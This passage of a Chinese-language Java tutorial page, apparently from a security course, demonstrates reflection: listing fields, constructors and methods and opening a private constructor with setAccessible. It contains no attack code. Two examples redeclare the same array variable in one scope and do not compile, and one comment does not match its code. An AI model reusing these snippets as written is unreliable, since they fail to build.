</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span><span class="lnt" id="39"><span class="lnlinks">39</span>
</span><span class="lnt" id="40"><span class="lnlinks">40</span>
</span><span class="lnt" id="41"><span class="lnlinks">41</span>
</span><span class="lnt" id="42"><span class="lnlinks">42</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//GetFiled.java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.reflectdemo1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">GetFiled</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.example.reflectdemo1.User&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//1.获取公共的成员变量</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="o">[]</span><span class="w"> </span><span class="n">fields</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getFields</span><span class="p">();</span><span class="w">    	
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="n">Field</span><span class="w"> </span><span class="n">fd</span><span class="p">:</span><span class="n">fields</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//2.获取所有的成员变量</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="o">[]</span><span class="w"> </span><span class="n">fields</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredFields</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="n">Field</span><span class="w"> </span><span class="n">fd</span><span class="p">:</span><span class="n">fields</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//3.获取单个的公共成员变量</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getField</span><span class="p">(</span><span class="s">&#34;name&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//4.获取单个的成员变量</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">gender</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;gender&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">gender</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//5.获取公共的成员变量age的值</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">User</span><span class="w"> </span><span class="n">u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">User</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="o">=</span><span class="n">aClass</span><span class="p">.</span><span class="na">getField</span><span class="p">(</span><span class="s">&#34;age&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//取值</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">a</span><span class="o">=</span><span class="n">field</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">u</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">a</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//赋值</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">u</span><span class="p">,</span><span class="n">32</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">aa</span><span class="o">=</span><span class="n">field</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">u</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">aa</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h4 id="constructor构造方法类获取">Constructor构造方法类获取<a hidden class="anchor" aria-hidden="true" href="#constructor构造方法类获取">#</a></h4>
<div class="code-block-container" id="code-1769750397339289200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397339289200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397339289200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397339289200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397339289200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span><span class="lnt" id="39"><span class="lnlinks">39</span>
</span><span class="lnt" id="40"><span class="lnlinks">40</span>
</span><span class="lnt" id="41"><span class="lnlinks">41</span>
</span><span class="lnt" id="42"><span class="lnlinks">42</span>
</span><span class="lnt" id="43"><span class="lnlinks">43</span>
</span><span class="lnt" id="44"><span class="lnlinks">44</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//GetConstructor.java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.reflectdemo1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationTargetException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">GetConstructor</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">InstantiationException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchMethodException</span><span class="p">,</span><span class="w"> </span><span class="n">InvocationTargetException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.example.reflectdemo1.User&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//1.获取公共的构造方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">[]</span><span class="w"> </span><span class="n">constructors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getConstructors</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="n">Constructor</span><span class="w"> </span><span class="n">c</span><span class="p">:</span><span class="n">constructors</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">c</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//2.获取所有的构造方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">[]</span><span class="w"> </span><span class="n">constructors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredConstructors</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="n">Constructor</span><span class="w"> </span><span class="n">c</span><span class="p">:</span><span class="n">constructors</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">c</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//3.获取单个的公共构造方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getConstructor</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">constructor</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//4.获取单个的构造方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">con3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">con3</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//获取类中声明的具有两个参数（String和int）的构造方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">con4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//临时开启对私有构造方法的访问权限</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">con4</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//使用构造方法创建对象，传递参数 &#34;xiaodigaygay&#34; 和 40</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">User</span><span class="w"> </span><span class="n">uu</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">User</span><span class="p">)</span><span class="w"> </span><span class="n">con4</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="s">&#34;xiaodisec&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">40</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">uu</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//获取类中声明的具有一个参数（String）的构造方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">con2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getConstructor</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//使用构造方法创建对象，传递参数 &#34;xiaodisec&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">con2</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="s">&#34;xiaodisec&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h4 id="method成员方法类获取">Method成员方法类获取<a hidden class="anchor" aria-hidden="true" href="#method成员方法类获取">#</a></h4>
<div class="code-block-container" id="code-1769750397348264600" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397348264600">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397348264600" title="Toggle" aria-expanded="false" aria-controls="code-1769750397348264600" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397348264600-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//GetMethod.java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.reflectdemo1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationTargetException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">GetMethod</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchMethodException</span><span class="p">,</span><span class="w"> </span><span class="n">InvocationTargetException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.example.reflectdemo1.User&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//1.获取包括继承的公共成员方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="o">[]</span><span class="w"> </span><span class="n">methods</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getMethods</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Method</span><span class="w"> </span><span class="n">me</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">methods</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">me</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//2.获取不包括继承的所有成员方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="o">[]</span><span class="w"> </span><span class="n">methods1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredMethods</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="n">Method</span><span class="w"> </span><span class="n">me</span><span class="p">:</span><span class="n">methods1</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">me</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//3.获取单个的成员方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;users&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
